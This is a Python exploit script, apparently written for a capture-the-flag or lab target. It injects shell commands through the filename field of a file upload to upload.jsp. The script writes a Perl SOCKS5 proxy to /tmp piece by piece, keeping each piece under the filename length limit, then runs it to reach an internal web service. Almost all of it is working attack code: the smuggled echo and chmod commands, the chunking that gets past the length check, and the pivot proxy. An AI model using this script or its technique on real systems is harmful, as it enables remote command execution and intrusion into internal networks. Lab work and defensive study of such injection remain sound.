#!/usr/bin/env python3
import requests
import time
import subprocess

# Configuration
TARGET_URL = "http://localhost:8080"
UPLOAD_URL = f"{TARGET_URL}/upload.jsp"

def create_socks_code():
    """Create the SOCKS5 proxy Perl code"""
    return '''#!/usr/bin/perl
use IO::Socket::INET;
$s=IO::Socket::INET->new(LocalHost=>"127.0.0.1",LocalPort=>1080,Proto=>"tcp",Listen=>5,Reuse=>1)or die"$!";
print"SOCKS5 on 1080\n";
while($c=$s->accept()){
if(fork()==0){
$c->sysread($b,2);
($v,$n)=unpack("CC",$b);
$c->sysread($b,$n);
$c->syswrite(pack("CC",5,0));
$c->sysread($b,4);
($v,$cmd,$r,$a)=unpack("CCCC",$b);
$c->sysread($b,1);
$l=unpack("C",$b);
$c->sysread($b,$l);
$addr=$b;
$c->sysread($b,2);
$port=unpack("n",$b);
$r=IO::Socket::INET->new(PeerHost=>$addr,PeerPort=>$port,Proto=>"tcp")or next;
$c->syswrite(pack("CCCC",5,0,0,1).pack("NN",0,0));
while($c->sysread($d,4096)){
$r->syswrite($d);
}
while($r->sysread($d,4096)){
$c->syswrite($d);
}
exit;
}
$c->close();
}'''

def create_chunks(code, max_chunk_size=35):
    """Create chunks that fit within filename limit"""
    chunks = []
    current_chunk = ""
    
    # Split by lines first, then by characters if needed
    lines = code.split('\n')
    
    for line in lines:
        # If line is too long, split it
        if len(line) > max_chunk_size:
            # Split long line into smaller pieces
            for i in range(0, len(line), max_chunk_size):
                piece = line[i:i + max_chunk_size]
                if len(current_chunk) + len(piece) <= max_chunk_size:
                    current_chunk += piece
                else:
                    if current_chunk:
                        chunks.append(current_chunk)
                    current_chunk = piece
        else:
            # Check if we can add this line to current chunk
            if len(current_chunk) + len(line) + 1 <= max_chunk_size:
                current_chunk += line + '\n'
            else:
                if current_chunk:
                    chunks.append(current_chunk.rstrip())
                current_chunk = line + '\n'
    
    # Add remaining chunk
    if current_chunk:
        chunks.append(current_chunk.rstrip())
    
    return chunks

def create_chunk_payload(chunk, chunk_num, is_first=False):
    """Create payload for uploading a chunk"""
    if is_first:
        # First chunk: create file
        command = f"echo '{chunk}' > /tmp/socks.pl"
    else:
        # Subsequent chunks: append to file
        command = f"echo '{chunk}' >> /tmp/socks.pl"
    
    # Escape single quotes for command injection
    escaped_command = command.replace("'", "'\"'\"'")
    
    # Create filename payload
    filename = f"';{escaped_command};echo '"
    
    return filename

def create_execute_payload():
    """Create payload to execute the SOCKS5 proxy"""
    command = "chmod +x /tmp/socks.pl && /tmp/socks.pl &"
    
    # Escape single quotes for command injection
    escaped_command = command.replace("'", "'\"'\"'")
    
    # Create filename payload
    filename = f"';{escaped_command};echo '"
    
    return filename

def upload_chunk(filename):
    """Upload a file with the given filename"""
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    body = f"""--{boundary}\r
Content-Disposition: form-data; name="file"; filename="{filename}"\r
Content-Type: text/plain\r
\r
dummy\r
--{boundary}--\r
"""
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body))
    }
    
    try:
        response = requests.post(UPLOAD_URL, data=body, headers=headers, timeout=10)
        return response.status_code == 200
    except:
        return False

def test_socks5():
    """Test if SOCKS5 proxy is working"""
    try:
        result = subprocess.run([
            'curl', '--socks5', '127.0.0.1:1080', 
            '--connect-timeout', '5',
            'http://internal_web:5000/'
        ], capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0 and "Congratulation" in result.stdout:
            print("SUCCESS! SOCKS5 proxy is working!")
            print("Response:", result.stdout.strip())
            return True
        else:
            print("SOCKS5 test failed")
            return False
            
    except Exception as e:
        print(f"Error testing SOCKS5: {e}")
        return False

def main():
    print("=== Chunked SOCKS5 Proxy Exploit ===")
    print(f"Target: {TARGET_URL}")
    
    # Create SOCKS5 code
    print("\n1. Creating SOCKS5 proxy code...")
    socks_code = create_socks_code()
    print(f"Total code length: {len(socks_code)} characters")
    
    # Split into chunks
    print("\n2. Splitting code into chunks...")
    chunks = create_chunks(socks_code, max_chunk_size=35)
    print(f"Number of chunks: {len(chunks)}")
    
    for i, chunk in enumerate(chunks):
        print(f"Chunk {i+1}: {len(chunk)} chars")
    
    # Upload chunks
    print("\n3. Uploading code chunks...")
    for i, chunk in enumerate(chunks):
        print(f"Uploading chunk {i+1}/{len(chunks)}...")
        filename = create_chunk_payload(chunk, i, is_first=(i==0))
        
        if len(filename) >= 50:
            print(f"ERROR: Chunk {i+1} payload too long! ({len(filename)} chars)")
            return
        
        success = upload_chunk(filename)
        if success:
            print(f"Chunk {i+1} uploaded successfully")
        else:
            print(f"Chunk {i+1} upload failed")
            return
        
        time.sleep(0.3)  # Small delay between requests
    
    # Execute the SOCKS5 proxy
    print("\n4. Executing SOCKS5 proxy...")
    execute_filename = create_execute_payload()
    
    if len(execute_filename) >= 50:
        print("ERROR: Execute payload too long!")
        return
    
    success = upload_chunk(execute_filename)
    if success:
        print("SOCKS5 proxy execution command sent")
    else:
        print("SOCKS5 proxy execution failed")
        return
    
    # Wait for SOCKS5 to start
    print("\n5. Waiting for SOCKS5 proxy to start...")
    time.sleep(3)
    
    # Test SOCKS5
    print("\n6. Testing SOCKS5 proxy...")
    if test_socks5():
        print("\n=== EXPLOIT SUCCESSFUL ===")
        print("SOCKS5 proxy is running on 127.0.0.1:1080")
        print("You can now use it with: curl --socks5 127.0.0.1:1080 http://internal_web:5000/")
    else:
        print("\n=== EXPLOIT FAILED ===")

if __name__ == "__main__":
    main()




